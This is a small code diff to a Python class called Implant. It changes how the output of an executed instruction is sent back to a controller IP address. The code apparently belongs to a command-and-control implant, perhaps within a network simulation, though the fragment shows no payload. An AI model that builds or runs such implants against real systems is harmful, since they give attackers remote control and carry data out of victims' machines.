@@ -33,7 +33,7 @@ class Implant(Host):
             
             print(output)
 
-            self.send(self.controller_ip, "instruction", "response", output.encode())
+            self.send(self.controller_ip, "instruction", "response", output)
         except TimeoutExpired:
             raise Exception
         # except Exception:
